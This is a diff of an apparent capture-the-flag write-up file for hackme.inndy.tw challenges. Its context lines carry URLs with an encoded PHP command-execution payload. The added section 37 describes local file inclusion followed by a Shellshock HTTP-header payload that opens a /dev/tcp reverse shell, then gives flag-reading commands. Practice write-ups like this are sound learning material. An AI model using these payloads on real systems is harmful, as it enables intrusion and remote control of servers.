@@ -70,6 +70,19 @@
     - [step3](https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&command=JF9HRVRbImEiXSgkX0dFVFsiY21kIl0pOw==.e3b4d16fa8cb3014e81ba999ac1b516f5b54f7bcdbc39339571ec1a8add2c182&dir[]=%22&a=system&cmd=cat%20flag3/meow.c)
     - [step4](https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&command=JF9HRVRbImEiXSgkX0dFVFsiY21kIl0pOw==.e3b4d16fa8cb3014e81ba999ac1b516f5b54f7bcdbc39339571ec1a8add2c182&dir[]=%22&a=system&cmd=./flag3/meow%20flag3/flag3)
 
+## 37
+  using LFI get the source code and
+the source code will execute `putenv()` function, and the `bash`
+4.3 has `shellshock` then set a payload in http header, open reverse shell
+
+`() { : ; }; /bin/bash -i >& /dev/tcp/`**`ip`**`/`**`port`**` 0>&1 &`
+
+```bash
+cd /
+flag-reader flag < /var/tmp/1 > /var/tmp/1
+cat /var/tmp/1
+```
+
 ## 41 helloworld
   ```
     objdump -d helloworld | less
